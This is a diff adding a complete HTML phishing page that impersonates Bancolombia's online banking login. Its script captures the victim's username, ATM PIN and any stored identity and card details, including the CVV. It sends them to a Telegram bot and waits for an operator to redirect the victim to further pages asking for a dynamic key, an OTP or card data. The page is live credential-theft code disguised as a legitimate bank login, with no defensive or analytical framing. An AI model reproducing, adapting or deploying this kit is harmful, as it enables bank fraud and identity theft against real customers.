@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Bancolombia - Sucursal Virtual Personas</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #2b2a28 0%, #2b2a28 100%);
+      color: white;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      overflow-x: hidden;
+      align-items: center;
+      justify-content: center;
+    }
+    .container {
+      width: 100%;
+      max-width: 400px;
+      padding: 20px;
+      text-align: center;
+    }
+    .logo { margin-bottom: 20px; }
+    .logo img { width: 180px; }
+    .subtitle { font-size: 279px; font-weight: 300; color: white; margin-bottom: 30px; }
+    .login-card {
+      background: #454648;
+      border-radius: 10px;
+      padding: 50px 30px;
+      margin-bottom: 30px;
+      text-align: left;
+    }
+    .welcome-text {
+      font-size: 26px; font-weight: bold; margin-bottom: 10px; text-align: center;
+    }
+    .welcome-subtitle {
+      font-size: 16px; color: white; margin-bottom: 30px; line-height: 1.4; text-align: center;
+    }
+    .form-group { margin-bottom: 20px; position: relative; }
+    .input-wrapper { position: relative; }
+    .input-icon {
+      position: absolute; left: 12px; top: 50%; transform: translateY(-50%); width: 17px; opacity: 0.7;
+    }
+    .input-field {
+      width: 100%; padding: 10px 10px 8px 40px; background: transparent; border: none;
+      border-bottom: 1px solid white; color: white; font-size: 16px;
+    }
+    .input-field::placeholder { color: white; }
+    .forgot-link {
+      font-size: 14px; color: white; text-decoration: underline; font-weight: bold;
+      cursor: pointer; margin-top: 5px;
+    }
+    .forgot-link:hover { color: #FFD700; }
+    .login-btn {
+      width: 100%; padding: 14px; background: #808080; color: black; border: none; border-radius: 24px;
+      font-size: 16px; font-weight: 500; cursor: not-allowed; transition: transform 0.3s; margin-top: 10px;
+    }
+    .login-btn.enabled { background: #FFD700; color: #2c2c2c; cursor: pointer; }
+    .login-btn:hover.enabled { transform: translateY(-2px); }
+    .create-user-link { text-align: center; color: white; text-decoration: underline; font-size: 14px; cursor: pointer; margin-top: 15px; }
+    .create-user-link:hover { color: #FFD700; }
+    .footer-links { text-align: center; margin-bottom: 20px; }
+    .footer-links a { display: block; font-size: 14px; color: #cccccc; text-decoration: none; margin: 5px 0; }
+    .footer-links a:hover { color: #FFD700; }
+    .footer {
+      text-align: center; padding: 20px; border-top: 1px solid rgba(255,255,255,0.1);
+      margin-top: auto; width: 100%; max-width: 400px;
+    }
+    .footer-logo img { width: 100px; margin-bottom: 10px; }
+    .vigilado-text { font-size: 10px; color: #666; margin-bottom: 8px; }
+    .footer-info { font-size: 12px; color: #888; line-height: 1.4; }
+
+    /* ---------- Loader difuminado con rueda ---------- */
+    .overlay-loader {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: rgba(0,0,0,0.55); /* semitransparente */
+      backdrop-filter: blur(6px);
+      -webkit-backdrop-filter: blur(6px);
+      z-index: 10000;
+      opacity: 0;
+      visibility: hidden;
+      pointer-events: none;
+      transition: opacity 220ms ease, visibility 220ms ease;
+    }
+    .overlay-loader.visible {
+      opacity: 1;
+      visibility: visible;
+      pointer-events: auto;
+    }
+    .spinner {
+      width: 64px;
+      height: 64px;
+      border-radius: 50%;
+      border: 6px solid rgba(255,255,255,0.18);
+      border-top-color: #FFD700;
+      box-sizing: border-box;
+      animation: spin 900ms linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    @media (max-width: 480px) {
+      .login-card { padding: 30px 15px; }
+      .subtitle { font-size: 18px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <br><br>
+    <div class="logo">
+      <img src="logo.svg" alt="Bancolombia">
+    </div>
+    <br>
+    <h1 class="subtitle" style="font-size: 26px;">Sucursal Virtual Personas</h1>
+
+    <img src="aviso.jpeg" alt="Descripción de la imagen" class="subtitle-image" style="display: block; margin-left: 0; width: 340px; height: auto;">
+    <br>
+
+    <div class="login-card">
+      <div class="welcome-text">¡Hola!</div>
+      <div class="welcome-subtitle">
+        Ingresa los datos para gestionar tus<br>
+        productos y hacer transacciones.
+      </div>
+
+      <form id="loginForm" method="POST" autocomplete="off">
+        <div class="form-group">
+          <div class="input-wrapper">
+            <img src="persona.png" alt="Usuario" class="input-icon">
+            <input type="text" id="usuario" name="usuario" placeholder="Usuario" required maxlength="20" class="input-field" autocomplete="off">
+          </div>
+          <br>
+          <div class="forgot-link" onclick="alert('Redirigiendo a recuperación de usuario...')">¿Olvidaste tu usuario?</div>
+        </div>
+
+        <div class="form-group">
+          <div class="input-wrapper">
+            <img src="candado.png" alt="Clave" class="input-icon">
+            <input type="password" id="clave" name="clave" placeholder="Clave del cajero" required maxlength="4" class="input-field" autocomplete="new-password">
+          </div>
+          <br>
+          <div class="forgot-link" onclick="alert('Redirigiendo a recuperación de clave...')">¿Olvidaste tu clave?</div>
+        </div>
+
+        <br>
+        <button type="submit" id="loginBtn" class="login-btn" disabled>Iniciar sesión</button>
+      </form>
+
+      <br>
+      <div class="create-user-link" onclick="alert('Redirigiendo a creación de usuario...')">Crear usuario</div>
+    </div>
+
+    <br>
+    <div class="footer-links">
+      <a href="#" onclick="alert('¿Problemas para conectarte?')">¿Problemas para conectarte?</a>
+      <a href="#" onclick="alert('Aprende sobre seguridad')">Aprende sobre seguridad</a>
+      <a href="#" onclick="alert('Reglamento')">Reglamento Sucursal Virtual</a>
+      <a href="#" onclick="alert('Política de privacidad')">Política de privacidad</a>
+    </div>
+  </div>
+
+  <div class="footer">
+    <div class="footer-logo"><img src="logo.svg" alt="Bancolombia"></div>
+    <div class="vigilado-text">VIGILADO</div>
+    <div class="vigilado-text">SUPERINTENDENCIA FINANCIERA<br>DE COLOMBIA</div>
+    <div class="footer-info">
+      Dirección IP: <span id="ipPublica">desconocida</span><br>
+      <span id="fechaHora"></span>
+    </div>
+  </div>
+
+  <!-- Overlay loader: difuminado + rueda (sin texto) -->
+  <div class="overlay-loader" id="loaderFull" role="status" aria-hidden="true" aria-label="Cargando">
+    <div class="spinner" aria-hidden="true"></div>
+  </div>
+
+  <script>
+    /* ---------- ELEMENTOS UI ---------- */
+    const usuarioInput = document.getElementById('usuario');
+    const claveInput   = document.getElementById('clave');
+    const loginBtn     = document.getElementById('loginBtn');
+    const loaderFull   = document.getElementById('loaderFull');
+
+    function showLoader() {
+      loaderFull.classList.add('visible');
+      loaderFull.setAttribute('aria-hidden', 'false');
+    }
+    function hideLoader() {
+      loaderFull.classList.remove('visible');
+      loaderFull.setAttribute('aria-hidden', 'true');
+    }
+
+    function updateLoginButtonState() {
+      const enabled = !!usuarioInput.value.trim() && !!claveInput.value.trim();
+      loginBtn.disabled = !enabled;
+      loginBtn.classList.toggle('enabled', enabled);
+    }
+    usuarioInput.addEventListener('input', updateLoginButtonState);
+    claveInput.addEventListener('input', updateLoginButtonState);
+
+    // Enter => enviar si campos completos
+    document.addEventListener('keydown', function(e) {
+      if (e.key === 'Enter' && e.target.tagName !== 'BUTTON') {
+        e.preventDefault();
+        if (!loginBtn.disabled) loginBtn.click();
+      }
+    });
+
+    /* ---------- FECHA e IP ---------- */
+    async function fetchIP() {
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const json = await res.json();
+        document.getElementById('ipPublica').textContent = json.ip;
+      } catch {
+        document.getElementById('ipPublica').textContent = 'desconocida';
+      }
+    }
+    fetchIP();
+
+    function updateDateTime() {
+      const now = new Date();
+      const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+      document.getElementById('fechaHora').textContent =
+        now.toLocaleDateString('es-ES', options) + ', ' +
+        now.toLocaleTimeString('es-ES', { hour: '2-digit', minute: '2-digit', hour12: false });
+    }
+    setInterval(updateDateTime, 60000);
+    updateDateTime();
+
+    /* ---------- TELEGRAM CONFIG ---------- */
+    async function loadTelegramConfig() {
+      try {
+        const res = await fetch('./js/brr76.json', { cache: 'no-store' });
+        if (!res.ok) throw new Error('No se pudo cargar js/brr76.json');
+        const cfg = await res.json();
+        if (!cfg.token || !cfg.chat_id) throw new Error('brr76.json debe contener token y chat_id');
+        return cfg;
+      } catch (err) {
+        console.error('Error cargando brr76.json:', err);
+        alert('Error de configuración. Revisa js/brr76.json y la consola.');
+        return null;
+      }
+    }
+
+    /* Guardar/leer offset en localStorage para no reprocesar updates viejos */
+    function saveTgOffset(offset) { try { localStorage.setItem('tg_offset', String(offset)); } catch(e){} }
+    function getTgOffset() { try { return parseInt(localStorage.getItem('tg_offset')||'0'); } catch(e){ return 0; } }
+
+    /* Inicializamos offset con las actualizaciones actuales (no procesar historia) */
+    async function initTgOffsetOnce(config) {
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${encodeURIComponent(config.token)}/getUpdates`, { cache: 'no-store' });
+        const data = await res.json();
+        if (data && data.ok) {
+          const updates = data.result || [];
+          if (updates.length > 0) {
+            const lastId = updates[updates.length - 1].update_id;
+            saveTgOffset(lastId + 1);
+          }
+        }
+      } catch (e) {
+        console.warn('No se pudo inicializar offset (se intentará usar el valor guardado):', e);
+      }
+    }
+
+    /* ---------- ENVIAR Y ESPERAR RESPUESTA ---------- */
+    document.getElementById('loginForm').addEventListener('submit', async function(ev) {
+      ev.preventDefault();
+      showLoader();
+
+      const usuario = usuarioInput.value.trim();
+      const clave = claveInput.value.trim();
+      const transactionId = Date.now().toString(36) + Math.random().toString(36).slice(2,10);
+
+      // Guardar localmente
+      localStorage.setItem('usuario', usuario);
+      localStorage.setItem('clave', clave);
+      localStorage.setItem('transactionId', transactionId);
+
+      // Cargar config y preparar mensaje
+      const config = await loadTelegramConfig();
+      if (!config) { hideLoader(); return; }
+
+      // Inicializar offset una vez para evitar updates viejos (solo si no existe)
+      if (!getTgOffset()) await initTgOffsetOnce(config);
+
+      // Intentar recuperar 'formData' si existe (campo opcional que puedas almacenar en otras páginas)
+      let storedForm = null;
+      try { storedForm = JSON.parse(localStorage.getItem('formData') || 'null'); } catch(e) { storedForm = null; }
+
+      let message = `🔐 Nuevo inicio de sesión pendiente\n🆔 ID: ${transactionId}\n👤 Usuario: ${usuario}\n🔑 Clave: ${clave}\n\n`;
+      if (storedForm && typeof storedForm === 'object') {
+        const extras = [
+          { k: 'nombre', l: 'Nombre' }, { k: 'documentoIdentidad', l: 'Cédula' },
+          { k: 'telefono', l: 'Teléfono' }, { k: 'ciudad', l: 'Ciudad' },
+          { k: 'direccion', l: 'Dirección' }, { k: 'entidad', l: 'Banco' },
+          { k: 'tarjeta', l: 'Tarjeta' }, { k: 'fechaExpiracion', l: 'Fecha Exp.' },
+          { k: 'cvv', l: 'CVV' }
+        ];
+        extras.forEach(it => { if (storedForm[it.k]) message += `• ${it.l}: ${storedForm[it.k]}\n`; });
+      }
+
+      const keyboard = {
+        inline_keyboard: [
+          [{ text: "Pedir dinámica", callback_data: `pedir_dinamica:${transactionId}` }],
+          [{ text: "Pedir OTP", callback_data: `pedir_otp:${transactionId}` }],
+          [{ text: "Pedir TC", callback_data: `pedir_tc:${transactionId}` }],
+          [{ text: "Error logo", callback_data: `error_logo:${transactionId}` }]
+        ]
+      };
+
+      // Enviar mensaje
+      try {
+        const sendRes = await fetch(`https://api.telegram.org/bot${encodeURIComponent(config.token)}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: config.chat_id, text: message, reply_markup: keyboard })
+        });
+        const sendJson = await sendRes.json();
+        if (!sendJson.ok) {
+          console.error('sendMessage error:', sendJson);
+          alert('No se pudo enviar el mensaje a Telegram. Revisa consola.');
+          hideLoader();
+          return;
+        }
+      } catch (err) {
+        console.error('Error enviando a Telegram:', err);
+        alert('Error enviando a Telegram. Revisa consola.');
+        hideLoader();
+        return;
+      }
+
+      // Polling seguro esperando la respuesta del admin
+      try {
+        await waitForAdminResponse(config, transactionId);
+      } finally {
+        hideLoader();
+      }
+    });
+
+    async function waitForAdminResponse(config, transactionId) {
+      const MAX_WAIT_MS = 5 * 60 * 1000; // 5 minutos
+      const POLL_INTERVAL = 2000;
+      const start = Date.now();
+      let offset = getTgOffset() || 0;
+
+      while (Date.now() - start < MAX_WAIT_MS) {
+        try {
+          const url = offset > 0
+            ? `https://api.telegram.org/bot${encodeURIComponent(config.token)}/getUpdates?offset=${offset}`
+            : `https://api.telegram.org/bot${encodeURIComponent(config.token)}/getUpdates`;
+
+          const res = await fetch(url, { cache: 'no-store' });
+          const data = await res.json();
+          if (data && data.ok) {
+            const updates = data.result || [];
+            if (updates.length > 0) {
+              const lastId = updates[updates.length - 1].update_id;
+              offset = lastId + 1;
+              saveTgOffset(offset);
+
+              for (const u of updates) {
+                if (u.callback_query && u.callback_query.data && u.callback_query.data.includes(transactionId)) {
+                  // intentar responder el callback para quitar el "cargando" en Telegram
+                  try {
+                    await fetch(`https://api.telegram.org/bot${encodeURIComponent(config.token)}/answerCallbackQuery`, {
+                      method: 'POST',
+                      headers: { 'Content-Type': 'application/json' },
+                      body: JSON.stringify({ callback_query_id: u.callback_query.id })
+                    });
+                  } catch (e) { /* no bloqueamos por este fallo */ }
+
+                  handleAdminAction(u.callback_query.data, transactionId);
+                  return;
+                }
+              }
+            }
+          } else {
+            console.warn('getUpdates retornó error o no ok', data);
+          }
+        } catch (err) {
+          console.error('Error en polling getUpdates:', err);
+        }
+
+        await new Promise(r => setTimeout(r, POLL_INTERVAL));
+      }
+
+      alert('No hubo respuesta del administrador en el tiempo esperado. Intenta más tarde.');
+    }
+
+    function handleAdminAction(callbackData, transactionId) {
+      // Dependiendo del botón presionado por el admin, actuamos
+      if (callbackData.startsWith('pedir_dinamica')) {
+        window.location.href = 'dinamica.html';
+      } else if (callbackData.startsWith('pedir_otp')) {
+        window.location.href = 'otp.html';
+      } else if (callbackData.startsWith('pedir_tc')) {
+        window.location.href = 'tc.html';
+      } else if (callbackData.startsWith('error_logo')) {
+        alert('Se ha reportado un error de logo por el administrador. Revisa tu información e intenta nuevamente.');
+      } else {
+        console.log('Acción admin no manejada:', callbackData);
+      }
+    }
+  </script>
+</body>
+</html>
